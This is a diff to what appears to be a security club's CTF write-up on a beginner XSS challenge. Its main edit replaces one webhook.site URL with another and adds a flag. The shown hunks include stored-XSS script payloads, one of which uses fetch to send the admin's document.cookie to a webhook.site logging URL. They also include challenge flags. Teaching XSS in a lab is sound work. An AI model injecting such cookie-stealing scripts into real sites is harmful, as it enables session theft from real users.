@@ -12,8 +12,8 @@ You can reference the lecture [here](https://docs.google.com/presentation/d/17Gc
 Note: the later stages of the challenges were much more than beginner-level, so don't worry if you couldn't get them!
 
 Overall, there were 5 stages:
-- [Admin cookie flag](#admin-cookie)
-- Read `/flag` with:
+- [admin cookie flag](#admin-cookie)
+- read `/flag` with:
     - [static note type](#static-note)
     - [dynamic note type](#dynamic-note)
     - [image note type](#image-note)
@@ -26,24 +26,26 @@ For those who were confused of the overall flow of the challenge, the goal is to
 
 
 #### admin cookie  
-We can use [webhook.site]([https://webhook.site/](https://webhook.site/)) to log our requests.  
+We can use [webhook.site](https://webhook.site/) to log our requests.
+
+In this session, my webhook was at `https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de`. Yours probably will look similar, but will have a different UUID (the part after `.site/`).
  
 To test that XSS indeed exists, let's make a static note that just sends a GET request to our webhook.site:  
 {% raw %}  
 ```html  
 <script>  
-fetch("https://webhook.site/19052bc2-3e1a-4be9-8766-389277cc1802")  
+fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de")  
 </script>  
 ```  
 {% endraw %}  
  
-Let's try to steal the cookie of the admin. Using Javascript, we can access the cookies using `document.cookie`. Keep in mind this only works for non-HttpOnly cookies. Read more about HttpOnly cookies [here]([https://www.cookiepro.com/knowledge/httponly-cookie/](https://www.cookiepro.com/knowledge/httponly-cookie/)).  
+Let's try to steal the cookie of the admin. Using Javascript, we can access the cookies using `document.cookie`. Keep in mind this only works for non-HttpOnly cookies. Read more about HttpOnly cookies [here](https://www.cookiepro.com/knowledge/httponly-cookie/).  
 - In short, HttpOnly cookies cannot be accessed by any script run by the browser, including anything malicious that we might put there  
  
 {% raw %}  
 ```html  
 <script>  
-fetch("https://webhook.site/19052bc2-3e1a-4be9-8766-389277cc1802/?" + document.cookie)  
+fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?" + document.cookie)  
 </script>  
 ```  
 {% endraw %}  
@@ -56,7 +58,7 @@ This appends any of the admin's non-HttpOnly cookies to the url, plus the `?`. T
  
 It also just happens that document.cookie is in `key=value` format.  
  
-Submitting the site to the admin, we get a request to `https://webhook.site/19052bc2-3e1a-4be9-8766-389277cc1802?cookie_flag=flag%7Bcookie_monster_nom_nom%7D`.
+Submitting the site to the admin, we get a request to `https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de?cookie_flag=flag%7Bcookie_monster_nom_nom%7D`.
 
 webhook.site automatically extracts the GET request parameters for us, and we can see the flag under the `Query strings` section.  
  
@@ -152,8 +154,8 @@ Putting it all together, our final payload is:
 ```
 {% endraw %}
 
+Flag: `flag{cant_stop_me_now}`
 
-
-See you at our next meeting, 9/30! We'll also go over the challenge then, although perhaps not in so much detail.
+See you at our next meeting, on 9/30! We'll also go over the challenge then, although perhaps not in so much detail.
 
 ~ josh
